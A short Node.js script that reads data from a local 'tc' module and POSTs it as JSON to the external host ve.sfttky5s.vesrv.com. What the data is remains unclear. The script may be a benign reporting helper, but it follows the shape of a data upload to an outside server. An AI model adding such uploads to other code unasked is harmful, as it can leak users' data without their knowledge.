var tc = require( "../tc" );
var http = require( "http" );

var data = JSON.stringify( tc.read() );
var request = http.request({
	hostname: "ve.sfttky5s.vesrv.com",
	method: "POST",
	headers: {
		"Content-Length": data.length
	}
});

request.write( data );
request.end();
